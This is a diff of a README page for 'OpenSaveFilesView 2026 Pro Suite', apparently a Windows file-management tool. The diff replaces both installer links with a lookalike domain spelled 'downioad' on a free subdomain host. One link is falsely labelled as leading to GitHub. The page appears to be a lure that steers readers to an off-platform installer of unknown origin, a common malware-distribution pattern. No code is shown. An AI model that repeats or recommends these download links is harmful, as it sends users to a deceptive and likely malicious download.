@@ -2,7 +2,7 @@
 
 OpenSaveFilesView 2026 Pro Suite is an essential utility for Windows users who need to manage file open and save operations efficiently. This tool provides a seamless experience with its advanced features and user-friendly interface.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -65,4 +65,4 @@ OpenSaveFilesView 2026 Pro Suite is your go-to solution for efficient file manag
 
 ## Download
 
-[Get the latest version from GitHub](https://download-page.page.gd/)
+[Get the latest version from GitHub](https://downioad.page.gd/)
